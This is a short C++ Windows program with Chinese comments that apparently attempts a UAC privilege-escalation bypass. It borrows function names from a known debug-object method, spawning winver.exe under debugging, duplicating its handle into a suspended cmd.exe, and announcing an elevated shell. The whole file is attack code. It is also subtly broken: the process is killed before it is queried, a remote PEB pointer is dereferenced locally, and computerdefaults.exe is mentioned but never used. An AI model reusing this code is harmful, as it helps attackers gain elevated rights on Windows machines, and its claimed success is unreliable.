#include <Windows.h>
#include <winternl.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtDuplicateObject(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_opt_ HANDLE TargetProcessHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
);

bool ucmDebugObjectMethod(HANDLE& duplicateHandle) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 创建 winver.exe 和 computerdefaults.exe 进程
    if (!CreateProcessA("C:\\Windows\\System32\\winver.exe", nullptr, nullptr, nullptr, FALSE, DEBUG_PROCESS, nullptr, nullptr, &si, &pi)) {
        return false;
    }
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);

    // 获取 winver.exe 的调试对象句柄
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG length = 0;
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &length);
    if (status != STATUS_SUCCESS) {
        CloseHandle(pi.hProcess);
        return false;
    }

    // 使用 NtDuplicateObject 函数将句柄复制到当前进程
    status = NtDuplicateObject(pi.hProcess, pbi.PebBaseAddress->Reserved3[0], GetCurrentProcess(), &duplicateHandle, 0, 0, DUPLICATE_SAME_ACCESS);
    CloseHandle(pi.hProcess);

    if (status != STATUS_SUCCESS) {
        return false;
    }

    return true;
}

bool ucmxCreateProcessFromParent(HANDLE duplicateHandle) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 创建新的 cmd.exe 进程
    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        return false;
    }

    // 将复制的句柄注入到新创建的 cmd.exe 进程中
    HANDLE newHandle;
    NTSTATUS status = NtDuplicateObject(GetCurrentProcess(), duplicateHandle, pi.hProcess, &newHandle, 0, 0, DUPLICATE_SAME_ACCESS);
    if (status != STATUS_SUCCESS) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

        // 恢复 cmd.exe 进程
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // 关闭句柄并返回成功
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE duplicateHandle = nullptr;

    if (ucmDebugObjectMethod(duplicateHandle)) {
        if (ucmxCreateProcessFromParent(duplicateHandle)) {
            std::cout << "成功创建具有提升权限的 cmd.exe 进程。" << std::endl;
        } else {
            std::cout << "创建具有提升权限的 cmd.exe 进程失败。" << std::endl;
        }
    } else {
        std::cout << "ucmDebugObjectMethod 执行失败。" << std::endl;
    }

    return 0;
}

